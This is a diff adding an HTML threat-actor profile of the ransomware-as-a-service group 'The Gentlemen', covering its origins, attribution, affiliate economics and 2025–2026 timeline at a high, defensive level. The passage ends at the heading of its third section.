@@ -1,0 +1,1224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>The Gentlemen — Threat Actor Profile</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow+Condensed:wght@300;400;600;700;900&family=Barlow:wght@300;400;500&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --bg:          #080c10;
+    --bg2:         #0d1219;
+    --bg3:         #111820;
+    --bg4:         #161f29;
+    --border:      #1e2e3e;
+    --border2:     #243344;
+    --accent:      #00c8a0;
+    --accent2:     #ff4d4d;
+    --accent3:     #f5c542;
+    --accent4:     #5b9bd5;
+    --text:        #d0dde8;
+    --text-dim:    #5a7080;
+    --text-mid:    #8aa5bb;
+    --mono:        'Share Tech Mono', monospace;
+    --sans:        'Barlow Condensed', sans-serif;
+    --body:        'Barlow', sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 13px;
+    line-height: 1.55;
+    padding: 24px;
+    min-height: 100vh;
+    background-image:
+      radial-gradient(ellipse 80% 50% at 10% 0%, rgba(0,200,160,0.04) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 40% at 90% 100%, rgba(91,155,213,0.04) 0%, transparent 60%),
+      repeating-linear-gradient(0deg, transparent, transparent 39px, rgba(255,255,255,0.012) 40px),
+      repeating-linear-gradient(90deg, transparent, transparent 39px, rgba(255,255,255,0.012) 40px);
+  }
+
+  .header {
+    position: relative;
+    border: 1px solid var(--border2);
+    background: linear-gradient(135deg, #0a1520 0%, #0e1a28 60%, #071510 100%);
+    padding: 28px 32px 22px;
+    margin-bottom: 14px;
+    overflow: hidden;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: repeating-linear-gradient(-45deg, transparent, transparent 8px, rgba(0,200,160,0.018) 8px, rgba(0,200,160,0.018) 9px);
+    pointer-events: none;
+  }
+  .header::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 3px;
+    background: linear-gradient(90deg, var(--accent), transparent 50%, var(--accent4) 100%);
+  }
+  .header-top-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-bottom: 8px;
+  }
+  .tlp-badge {
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    padding: 3px 10px;
+    border-radius: 2px;
+  }
+  .tlp-clear  { background: #d0dde8; color: #080c10; }
+  .tlp-green  { background: #2d7a2d; color: #fff; }
+  .tlp-amber  { background: var(--accent3); color: #080c10; }
+  .tlp-red    { background: var(--accent2); color: #fff; }
+
+  .nation-badge {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--accent2);
+    border: 1px solid var(--accent2);
+    padding: 3px 10px;
+    letter-spacing: 0.08em;
+  }
+  .nation-badge.ecrime { color: var(--accent3); border-color: var(--accent3); }
+  .nation-badge.unknown { color: var(--text-dim); border-color: var(--border2); }
+
+  .header-meta {
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text-dim);
+    letter-spacing: 0.08em;
+    margin-bottom: 10px;
+  }
+  .header h1 {
+    font-family: var(--sans);
+    font-size: 68px;
+    font-weight: 900;
+    letter-spacing: -0.01em;
+    line-height: 0.9;
+    text-transform: uppercase;
+    color: #fff;
+    margin-bottom: 4px;
+  }
+  .header h1 .accent  { color: var(--accent); }
+  .header h1 .accent2 { color: var(--accent2); }
+  .header h1 .accent3 { color: var(--accent3); }
+  .header h1 .accent4 { color: var(--accent4); }
+  .header h1 .dim     { color: var(--text-dim); }
+
+  .header-sub {
+    font-family: var(--mono);
+    font-size: 8.5px;
+    color: var(--text-dim);
+    letter-spacing: 0.06em;
+    margin-top: 10px;
+  }
+  .classification-bar {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px 18px;
+    margin-top: 14px;
+    padding-top: 12px;
+    border-top: 1px solid var(--border2);
+    font-family: var(--mono);
+    font-size: 9.5px;
+    color: var(--text-dim);
+  }
+  .classification-bar span         { color: var(--accent); font-weight: 700; }
+  .classification-bar span.danger  { color: var(--accent2); }
+  .classification-bar span.warn    { color: var(--accent3); }
+  .classification-bar span.blue    { color: var(--accent4); }
+
+  .alert-banner {
+    border: 1px solid rgba(255,77,77,0.5);
+    background: linear-gradient(90deg, rgba(255,77,77,0.07) 0%, rgba(255,77,77,0.02) 100%);
+    padding: 14px 20px;
+    margin-bottom: 14px;
+    position: relative;
+  }
+  .alert-banner::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 3px;
+    background: var(--accent2);
+  }
+  .alert-label    { font-family: var(--mono); font-size: 9px; color: var(--accent2); letter-spacing: 0.1em; font-weight: 700; margin-bottom: 4px; }
+  .alert-headline { font-family: var(--sans); font-size: 15px; font-weight: 700; color: #fff; text-transform: uppercase; letter-spacing: 0.03em; margin-bottom: 5px; }
+  .alert-body     { font-family: var(--body); font-size: 11.5px; color: var(--text-mid); line-height: 1.5; }
+
+  .stat-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 8px;
+    margin-bottom: 14px;
+  }
+  .stat-cell { background: var(--bg3); border: 1px solid var(--border); padding: 12px 10px; text-align: center; }
+  .stat-val  { font-family: var(--sans); font-size: 26px; font-weight: 900; color: var(--accent); line-height: 1; }
+  .stat-val.red   { color: var(--accent2); }
+  .stat-val.amber { color: var(--accent3); }
+  .stat-val.blue  { color: var(--accent4); }
+  .stat-label { font-family: var(--mono); font-size: 8.5px; color: var(--text-dim); letter-spacing: 0.06em; text-transform: uppercase; margin-top: 4px; line-height: 1.3; }
+
+  .section { border: 1px solid var(--border2); background: var(--bg2); margin-bottom: 14px; }
+  .section-header { display: flex; align-items: center; gap: 14px; padding: 13px 22px; background: var(--bg3); border-bottom: 1px solid var(--border); }
+  .section-num   { font-family: var(--mono); font-size: 11px; color: var(--text-dim); letter-spacing: 0.1em; min-width: 22px; }
+  .section-title { font-family: var(--sans); font-weight: 700; font-size: 18px; letter-spacing: 0.01em; color: #fff; text-transform: uppercase; }
+  .section-title small { font-family: var(--body); font-weight: 400; font-size: 12px; color: var(--text-dim); text-transform: none; margin-left: 10px; }
+  .section-body  { padding: 22px; }
+
+  .prose { font-family: var(--body); font-size: 12.5px; color: var(--text-mid); line-height: 1.65; }
+  .prose p { margin-bottom: 12px; }
+  .prose p:last-child { margin-bottom: 0; }
+  .prose strong { color: var(--text); font-weight: 500; }
+  .prose em { color: var(--accent3); font-style: normal; }
+
+  .kv { display: flex; flex-direction: column; gap: 5px; }
+  .kv-row { display: flex; justify-content: space-between; align-items: flex-start; gap: 8px; padding: 5px 0; border-bottom: 1px solid rgba(30,46,62,0.5); }
+  .kv-row:last-child { border-bottom: none; }
+  .kv-key { font-family: var(--mono); font-size: 9.5px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.06em; white-space: nowrap; flex-shrink: 0; padding-top: 1px; }
+  .kv-val { font-family: var(--body); font-size: 11.5px; color: var(--text); text-align: right; line-height: 1.4; }
+  .kv-val.mono  { font-family: var(--mono); font-size: 10px; }
+  .kv-val.teal  { color: var(--accent); font-weight: 600; }
+  .kv-val.red   { color: var(--accent2); font-weight: 600; }
+  .kv-val.amber { color: var(--accent3); font-weight: 600; }
+  .kv-val.blue  { color: var(--accent4); font-weight: 600; }
+
+  .alias-grid { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 2px; }
+  .alias-chip { font-family: var(--mono); font-size: 9px; padding: 3px 8px; border: 1px solid var(--border2); color: var(--text-mid); background: var(--bg3); letter-spacing: 0.04em; border-radius: 2px; }
+  .alias-chip.primary { border-color: rgba(0,200,160,0.4); color: var(--accent); }
+
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 22px; }
+  .three-col { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 22px; }
+
+  .timeline { display: flex; flex-direction: column; }
+  .timeline-item { display: grid; grid-template-columns: 80px 12px 1fr; gap: 0 10px; align-items: stretch; min-height: 48px; }
+  .timeline-date { font-family: var(--mono); font-size: 9px; color: var(--text-dim); text-align: right; padding-top: 3px; line-height: 1.3; }
+  .timeline-track { display: flex; flex-direction: column; align-items: center; }
+  .timeline-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent); border: 1px solid var(--bg); flex-shrink: 0; margin-top: 4px; }
+  .timeline-dot.red   { background: var(--accent2); }
+  .timeline-dot.amber { background: var(--accent3); }
+  .timeline-dot.blue  { background: var(--accent4); }
+  .timeline-line { flex: 1; width: 1px; background: var(--border2); margin-top: 2px; }
+  .timeline-item:last-child .timeline-line { display: none; }
+  .timeline-content { padding: 3px 0 16px; border-bottom: 1px dotted rgba(30,46,62,0.4); }
+  .timeline-item:last-child .timeline-content { border-bottom: none; }
+  .timeline-phase { font-family: var(--sans); font-size: 13px; font-weight: 700; color: #fff; text-transform: uppercase; letter-spacing: 0.05em; line-height: 1.2; margin-bottom: 4px; }
+  .timeline-desc  { font-family: var(--body); font-size: 11px; color: var(--text-mid); line-height: 1.5; }
+
+  .mitre-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 7px; }
+  .mitre-cell { background: var(--bg3); border: 1px solid var(--border); padding: 9px 11px; border-left: 2px solid var(--accent4); }
+  .mitre-cell.red    { border-left-color: var(--accent2); }
+  .mitre-cell.amber  { border-left-color: var(--accent3); }
+  .mitre-cell.green  { border-left-color: var(--accent); }
+  .mitre-tactic { font-family: var(--mono); font-size: 8px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 3px; }
+  .mitre-id    { font-family: var(--mono); font-size: 9px; color: var(--accent4); font-weight: 700; }
+  .mitre-cell.red   .mitre-id { color: var(--accent2); }
+  .mitre-cell.amber .mitre-id { color: var(--accent3); }
+  .mitre-cell.green .mitre-id { color: var(--accent); }
+  .mitre-name  { font-family: var(--body); font-size: 10.5px; color: var(--text); margin-top: 3px; line-height: 1.35; }
+  .mitre-note  { font-family: var(--body); font-size: 10px; color: var(--text-mid); margin-top: 4px; line-height: 1.35; font-style: italic; }
+  .mitre-framework { font-family: var(--mono); font-size: 7.5px; color: var(--accent3); letter-spacing: 0.08em; margin-bottom: 2px; }
+
+  .sector-list { display: flex; flex-direction: column; gap: 7px; }
+  .sector-row  { display: grid; grid-template-columns: 180px 1fr 56px; align-items: center; gap: 8px; }
+  .sector-name { font-family: var(--body); font-size: 11px; color: var(--text); }
+  .sector-bar-wrap { height: 6px; background: var(--bg3); border: 1px solid var(--border); border-radius: 1px; overflow: hidden; }
+  .sector-bar  { height: 100%; background: linear-gradient(90deg, var(--accent2), var(--accent3)); border-radius: 1px; }
+  .sector-pct  { font-family: var(--mono); font-size: 9px; color: var(--text-dim); text-align: right; }
+
+  .tool-list { display: flex; flex-direction: column; gap: 8px; }
+  .tool-item { background: var(--bg3); border: 1px solid var(--border); border-left: 2px solid var(--accent2); padding: 10px 14px; }
+  .tool-item.amber { border-left-color: var(--accent3); }
+  .tool-item.blue  { border-left-color: var(--accent4); }
+  .tool-item.green { border-left-color: var(--accent); }
+  .tool-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; flex-wrap: wrap; gap: 4px; }
+  .tool-name { font-family: var(--mono); font-size: 11px; color: var(--accent2); font-weight: 700; letter-spacing: 0.04em; }
+  .tool-item.amber .tool-name { color: var(--accent3); }
+  .tool-item.blue  .tool-name { color: var(--accent4); }
+  .tool-item.green .tool-name { color: var(--accent); }
+  .tool-tag  { font-family: var(--mono); font-size: 8px; color: var(--text-dim); border: 1px solid var(--border2); padding: 1px 6px; }
+  .tool-desc { font-family: var(--body); font-size: 11px; color: var(--text-mid); line-height: 1.45; }
+
+  .ioc-table { width: 100%; border-collapse: collapse; }
+  .ioc-table th { font-family: var(--mono); font-size: 9px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.07em; text-align: left; padding: 5px 8px; border-bottom: 1px solid var(--border2); }
+  .ioc-table td { font-family: var(--mono); font-size: 10px; color: var(--text-mid); padding: 5px 8px; border-bottom: 1px solid rgba(30,46,62,0.4); vertical-align: top; }
+  .ioc-table td.type-label { color: var(--accent3); font-size: 9px; white-space: nowrap; }
+  .ioc-table td.val { color: var(--text); word-break: break-all; }
+  .ioc-defang-note { font-family: var(--mono); font-size: 8.5px; color: var(--accent3); margin-bottom: 10px; padding: 5px 8px; border-left: 2px solid var(--accent3); background: rgba(245,197,66,0.05); }
+
+  .cm-list { display: flex; flex-direction: column; }
+  .cm-item { display: flex; gap: 12px; align-items: flex-start; padding: 8px 0; border-bottom: 1px solid rgba(30,46,62,0.35); }
+  .cm-item:last-child { border-bottom: none; }
+  .cm-num  { font-family: var(--mono); font-size: 10px; color: var(--accent3); font-weight: 700; flex-shrink: 0; margin-top: 1px; min-width: 22px; }
+  .cm-text { font-family: var(--body); font-size: 11.5px; color: var(--text-mid); line-height: 1.5; }
+  .cm-text strong { color: var(--text); font-weight: 500; }
+  .cm-ttp  { font-family: var(--mono); font-size: 9px; color: var(--accent4); margin-top: 3px; }
+
+  .ref-list { display: flex; flex-direction: column; gap: 6px; }
+  .ref-item { display: grid; grid-template-columns: 110px 1fr; gap: 8px; padding: 5px 0; border-bottom: 1px solid rgba(30,46,62,0.35); font-size: 11px; }
+  .ref-item:last-child { border-bottom: none; }
+  .ref-source { font-family: var(--mono); font-size: 9px; color: var(--accent); text-transform: uppercase; letter-spacing: 0.05em; padding-top: 2px; }
+  .ref-detail { font-family: var(--body); color: var(--text-mid); line-height: 1.4; }
+  .ref-detail a { color: var(--accent4); text-decoration: none; }
+  .ref-detail a:hover { text-decoration: underline; }
+  .ref-date { font-family: var(--mono); font-size: 9px; color: var(--text-dim); margin-top: 2px; }
+
+  .opsec-list { display: flex; flex-direction: column; gap: 8px; }
+  .opsec-item {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-left: 2px solid var(--accent3);
+    padding: 10px 14px;
+  }
+  .opsec-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; flex-wrap: wrap; gap: 6px; }
+  .opsec-category { font-family: var(--mono); font-size: 9px; color: var(--accent3); text-transform: uppercase; letter-spacing: 0.08em; font-weight: 700; }
+  .opsec-confidence { font-family: var(--mono); font-size: 8px; color: var(--text-dim); border: 1px solid var(--border2); padding: 1px 6px; }
+  .opsec-desc { font-family: var(--body); font-size: 11.5px; color: var(--text-mid); line-height: 1.5; }
+  .opsec-desc strong { color: var(--text); font-weight: 500; }
+
+  .evasion-list { display: flex; flex-direction: column; gap: 8px; }
+  .evasion-item {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-left: 2px solid var(--accent2);
+    padding: 10px 14px;
+  }
+  .evasion-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 6px; }
+  .evasion-technique { font-family: var(--mono); font-size: 10px; color: var(--accent2); font-weight: 700; letter-spacing: 0.04em; }
+  .evasion-ttp { font-family: var(--mono); font-size: 9px; color: var(--accent4); }
+  .evasion-tags { display: flex; gap: 4px; flex-wrap: wrap; }
+  .evasion-tag { font-family: var(--mono); font-size: 8px; color: var(--text-dim); border: 1px solid var(--border2); padding: 1px 6px; }
+  .evasion-tag.edr    { border-color: rgba(255,77,77,0.3); color: var(--accent2); }
+  .evasion-tag.siem   { border-color: rgba(91,155,213,0.3); color: var(--accent4); }
+  .evasion-tag.network { border-color: rgba(0,200,160,0.3); color: var(--accent); }
+  .evasion-desc { font-family: var(--body); font-size: 11.5px; color: var(--text-mid); line-height: 1.5; margin-bottom: 6px; }
+  .evasion-desc strong { color: var(--text); font-weight: 500; }
+  .evasion-detail {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-mid);
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 6px 10px;
+    line-height: 1.6;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  .ctid-block {
+    background: var(--bg3);
+    border: 1px solid rgba(0,200,160,0.2);
+    border-left: 3px solid var(--accent);
+    padding: 16px 20px;
+    margin-bottom: 14px;
+  }
+  .ctid-block.not-available {
+    border-left-color: var(--text-dim);
+    border-color: var(--border);
+  }
+  .ctid-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; flex-wrap: wrap; }
+  .ctid-tag {
+    font-family: var(--mono);
+    font-size: 10px;
+    font-weight: 700;
+    padding: 3px 10px;
+    background: rgba(0,200,160,0.08);
+    border: 1px solid rgba(0,200,160,0.3);
+    color: var(--accent);
+    letter-spacing: 0.07em;
+  }
+  .ctid-tag.not-available { background: rgba(58,85,102,0.12); border-color: var(--border2); color: var(--text-dim); }
+  .ctid-title { font-family: var(--sans); font-size: 15px; font-weight: 700; color: #fff; text-transform: uppercase; }
+  .ctid-body { font-family: var(--body); font-size: 11.5px; color: var(--text-mid); line-height: 1.55; margin-bottom: 10px; }
+  .ctid-links { display: flex; gap: 8px; flex-wrap: wrap; }
+  .ctid-link {
+    font-family: var(--mono);
+    font-size: 9.5px;
+    color: var(--accent);
+    border: 1px solid rgba(0,200,160,0.25);
+    padding: 3px 10px;
+    text-decoration: none;
+    letter-spacing: 0.05em;
+    transition: border-color 0.15s;
+  }
+  .ctid-link:hover { border-color: var(--accent); }
+  .ctid-phases { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 8px; }
+  .ctid-phase-chip {
+    font-family: var(--mono);
+    font-size: 8.5px;
+    padding: 2px 8px;
+    background: var(--bg2);
+    border: 1px solid var(--border2);
+    color: var(--text-dim);
+    letter-spacing: 0.04em;
+  }
+
+  .footer {
+    margin-top: 14px;
+    padding: 10px 18px;
+    border: 1px solid var(--border);
+    background: var(--bg2);
+    display: flex;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 6px;
+    font-family: var(--mono);
+    font-size: 8.5px;
+    color: var(--text-dim);
+  }
+  .footer .draft-warn { color: var(--accent3); font-weight: 700; }
+
+  @media (max-width: 960px) {
+    .mitre-grid { grid-template-columns: repeat(2, 1fr); }
+    .stat-grid  { grid-template-columns: repeat(2, 1fr); }
+    .two-col, .three-col { grid-template-columns: 1fr; }
+  }
+  @media (max-width: 600px) {
+    body { padding: 10px; }
+    .header h1 { font-size: 42px; }
+    .mitre-grid { grid-template-columns: 1fr 1fr; }
+    .sector-row { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-top-row">
+    <div class="tlp-badge tlp-clear">TLP:CLEAR</div>
+    <div class="nation-badge ecrime">$ FINANCIALLY MOTIVATED · RAAS · LIKELY RUSSIAN-SPEAKING (CIS-AVOIDANT)</div>
+  </div>
+  <div class="header-meta">// Threat Actor Profile — Ransomware-as-a-Service / Multi-Platform Encryptor Operation</div>
+  <h1><span class="accent">THE</span> GENTLEMEN</h1>
+  <div class="header-sub">
+    PROFILE COMPILED: 2026-09-08 &nbsp;|&nbsp;
+    SOURCES: Check Point Research, Microsoft MSTIC, Halcyon, Huntress, FortiGuard, The Cyber Express, MITRE CTID (7 sources)
+  </div>
+  <div class="classification-bar">
+    <div>Status: <span class="danger">ACTIVE — RAPIDLY SCALING</span></div>
+    <div>Threat Level: <span class="danger">CRITICAL</span></div>
+    <div>Primary Motive: <span>Financial Extortion (Double-Extortion RaaS)</span></div>
+    <div>Active Since: <span>July 2025</span></div>
+    <div>MITRE ATT&amp;CK: <span>No G-ID assigned as of compile date</span></div>
+  </div>
+</div>
+
+<div class="alert-banner">
+  <div class="alert-label">⚡ THREAT INTEL UPDATE — 2026-07-24</div>
+  <div class="alert-headline">Named Most Active Ransomware Operation Globally, Q2 2026</div>
+  <div class="alert-body">Cyble Research and Intelligence Labs designated The Gentlemen the single most active ransomware group worldwide during Q2 2026, outpacing established operations including LockBit, Cl0p, and RansomHub (The Insurer, 2026-07-24). This follows a May 4, 2026 leak of the group's internal "Rocket" backend database, which independently corroborated the scale and structure Check Point Research and Halcyon had already begun tracking. The group shows no sign of slowing as of this compile date.</div>
+</div>
+
+<div class="stat-grid">
+  <div class="stat-cell">
+    <div class="stat-val red">328+</div>
+    <div class="stat-label">Victims Claimed, Jan–May 2026</div>
+  </div>
+  <div class="stat-cell">
+    <div class="stat-val amber">#1</div>
+    <div class="stat-label">Most Active RaaS Globally, Q2 2026</div>
+  </div>
+  <div class="stat-cell">
+    <div class="stat-val blue">90%</div>
+    <div class="stat-label">Affiliate Profit Share</div>
+  </div>
+  <div class="stat-cell">
+    <div class="stat-val">66</div>
+    <div class="stat-label">Countries Targeted</div>
+  </div>
+</div>
+
+<!-- SECTION 00 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">00</div>
+    <div class="section-title">Overview</div>
+  </div>
+  <div class="section-body">
+    <div class="prose">
+      <p>The Gentlemen is a ransomware-as-a-service operation that, in barely over a year of existence, has become the single most prolific ransomware brand on the internet by volume. Formed in July 2025 out of a payment dispute with the Qilin RaaS program — its founder publicly alleged Qilin owed him roughly $48,000 in unpaid affiliate commissions — the group spent two months building its own infrastructure before opening its doors to affiliates in September 2025. By the first five months of 2026 it had claimed more than 328 victims across 66 countries, and by Q2 2026, Cyble Research and Intelligence Labs ranked it the most active ransomware operation globally, ahead of established brands like LockBit, Cl0p, and RansomHub (The Insurer, 2026-07-24; Halcyon, 2026).</p>
+      <p>What makes this growth curve unusual is not just its speed — the group matched in five months what took Akira twelve months and Qilin eighteen months to reach (Halcyon, 2026) — but the mechanism behind it. The Gentlemen offers affiliates a 90% cut of ransom proceeds, a figure matched previously only by RansomHub against the RaaS industry standard of 70–80% (Halcyon, 2026). That economic aggression, paired with a genuinely multi-platform Go-based locker capable of encrypting Windows, Linux, BSD, and NAS hosts alongside a dedicated C-based ESXi variant, has let a small core team punch far above its headcount.</p>
+      <p>On May 4, 2026, the group's own internal operational backend — a system it calls "Rocket" — was compromised and partially leaked by a third party operating under the handle "n7778." The leak included a server shadow file exposing operator usernames, roughly 44 megabytes of an estimated 16-gigabyte internal chat log archive, and enough operational detail that Check Point Research was able to publish an unusually granular profile of the group's leadership, tooling, and internal culture (Check Point Research, "Thus Spoke…The Gentlemen," 2026). That leak, rather than slowing the group down, arrived in the middle of its steepest growth quarter — underscoring that this operation's resilience does not depend on operational secrecy in the way older, more centralized ransomware brands did.</p>
+      <p>As of this compile date, no government has issued sanctions, no indictment has been unsealed, and MITRE has not yet assigned the group a formal ATT&amp;CK Group ID — all consistent with an operation that, however large, is still under a year old in its current form. That absence of formal legal or framework recognition should not be read as an absence of threat: the group's targeting explicitly avoids Commonwealth of Independent States countries, a pattern consistent with Russian-speaking operators operating under an informal non-aggression understanding with their home region's law enforcement, and its scaling trajectory now sits well past the volume threshold that historically has triggered coordinated international takedown operations against comparable brands (LockBit, Hive).</p>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 01 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">01</div>
+    <div class="section-title">Identity &amp; Attribution</div>
+  </div>
+  <div class="section-body">
+    <div class="two-col">
+      <div>
+        <div class="kv">
+          <div class="kv-row"><span class="kv-key">Primary Name</span><span class="kv-val teal">The Gentlemen</span></div>
+          <div class="kv-row"><span class="kv-key">Sponsor / Parent</span><span class="kv-val">None — independent criminal RaaS enterprise; predecessor identity "ArmCorp" (Qilin affiliate cluster)</span></div>
+          <div class="kv-row"><span class="kv-key">Actor Type</span><span class="kv-val amber">eCrime — Ransomware-as-a-Service Operator</span></div>
+          <div class="kv-row"><span class="kv-key">Primary Motivation</span><span class="kv-val">Financial — double-extortion ransom + data-sale leverage</span></div>
+          <div class="kv-row"><span class="kv-key">Active Since</span><span class="kv-val">July 2025 (first sample 2025-07-17; public split from Qilin 2025-07-22)</span></div>
+          <div class="kv-row"><span class="kv-key">Last Observed</span><span class="kv-val">Ongoing as of compile date — designated most active global RaaS operation, Q2 2026</span></div>
+          <div class="kv-row"><span class="kv-key">MITRE G-ID</span><span class="kv-val mono">Not yet assigned</span></div>
+          <div class="kv-row"><span class="kv-key">Legal Status</span><span class="kv-val">No public indictment, OFAC/EU sanction, or law enforcement action identified as of compile date</span></div>
+          <div class="kv-row"><span class="kv-key">Named Administrator</span><span class="kv-val mono">zeta88 (aka "hastalamuerte") — builds locker + RaaS panel, manages payouts</span></div>
+        </div>
+      </div>
+      <div>
+        <div style="margin-bottom: 10px; font-family: var(--mono); font-size: 9px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.08em;">Tracking Aliases</div>
+        <div class="alias-grid">
+          <span class="alias-chip primary">The Gentlemen</span>
+          <span class="alias-chip">ArmCorp (predecessor / pre-split identity)</span>
+        </div>
+        <div style="margin-top: 10px; font-family: var(--body); font-size: 10.5px; color: var(--text-dim); line-height: 1.5;">No secondary vendor nickname (e.g. a "-Panda"/"-Spider"/"-Chollima" style moniker) has converged across major vendors as of this compile date — consistent with the group's recency rather than any deliberate obfuscation of its own branding, which is unusually overt for a RaaS operation (public leak site, public X/Twitter naming-and-shaming account).</div>
+        <div style="margin-top: 14px; padding-top: 10px; border-top: 1px solid var(--border);">
+          <div style="font-family: var(--mono); font-size: 9px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px;">Attribution Confidence</div>
+          <div class="prose">
+            <p><strong>[HIGH]</strong> on the group's operational identity and its Qilin/ArmCorp lineage — this rests on the administrator's own public statements at the time of the split, independently corroborated by Check Point Research's analysis of leaked "Rocket" backend chat logs against separately-observed malware samples and infrastructure. <strong>[MEDIUM]</strong> on the completeness of the personnel roster: nine handles (zeta88, qbit, quant, Protagor, Wick, mAst3r, Bl0ck, JeLLy, Kunder) appear in the leaked material, but this is a snapshot of one leaked archive at one point in time, not a verified exhaustive membership list, and a RaaS model by definition includes an unknown number of additional, uncatalogued affiliates operating under 8 distinct Tox IDs across at least 29 identified campaigns (Check Point Research, 2026). What would raise this to HIGH: independent confirmation of individual handles' real-world identities via law enforcement action, which has not yet occurred.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 02 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">02</div>
+    <div class="section-title">Campaign &amp; Operational Timeline</div>
+  </div>
+  <div class="section-body">
+    <div class="timeline">
+      <div class="timeline-item">
+        <div class="timeline-date">JUL 2025</div>
+        <div class="timeline-track"><div class="timeline-dot blue"></div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-phase">Formation &amp; Split From Qilin</div>
+          <div class="timeline-desc">First ransomware sample appears 2025-07-17. On 2025-07-22, administrator "hastalamuerte" publicly alleges Qilin owes his cluster (then operating as ArmCorp, a Qilin affiliate) approximately $48,000 in unpaid commissions, triggering the public break and rebrand (Halcyon, 2026).</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-date">SEP 2025</div>
+        <div class="timeline-track"><div class="timeline-dot blue"></div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-phase">RaaS Platform Publicly Marketed</div>
+          <div class="timeline-desc">The Gentlemen opens its affiliate program on criminal forums, advertising a 90%-affiliate / 10%-operator profit split — an aggressive rate matched previously only by RansomHub against a 70–80% industry norm (Halcyon, 2026).</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-date">JAN–MAR 2026</div>
+        <div class="timeline-track"><div class="timeline-dot amber"></div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-phase">Explosive Scaling Period</div>
+          <div class="timeline-desc">48 claimed attacks in January, 91 in February; more than 200 cumulative victims claimed January through March 2026, a pace Halcyon assesses as mirroring early LockBit 3.0's growth curve and second in volume only to Qilin during this specific window (Halcyon, 2026).</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-date">4 MAY 2026</div>
+        <div class="timeline-track"><div class="timeline-dot red"></div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-phase">"Rocket" Backend Database Leaked</div>
+          <div class="timeline-desc">A third party operating as "n7778" sells proof files from the group's internal operational system ("Rocket"): a server shadow file exposing operator usernames, and roughly 44.4 MB of an estimated 16.22 GB internal chat archive spanning INFO, general, TOOLS, and PODBOR channels. This becomes the primary source base for Check Point Research's subsequent deep-dive profile (Check Point Research, 2026).</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-date">28 MAY 2026</div>
+        <div class="timeline-track"><div class="timeline-dot amber"></div><div class="timeline-line"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-phase">Microsoft Publishes Technical Dissection</div>
+          <div class="timeline-desc">Microsoft's Security Blog publishes a detailed technical analysis of the self-propagating Go-based encryptor, releases the Defender detection signature Ransom:Win64/Gentlemen.A, and documents the 21-attempt multi-vector lateral spread mechanism (Microsoft Security Blog, 2026-05-28).</div>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-date">Q2 2026</div>
+        <div class="timeline-track"><div class="timeline-dot red"></div></div>
+        <div class="timeline-content">
+          <div class="timeline-phase">Ranked #1 Most Active RaaS Globally</div>
+          <div class="timeline-desc">Cyble Research and Intelligence Labs designates The Gentlemen the most active ransomware operation worldwide for Q2 2026, a ranking publicly reported 2026-07-24, outpacing LockBit, Cl0p, and RansomHub (The Insurer, 2026-07-24).</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 03 -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">03</div>
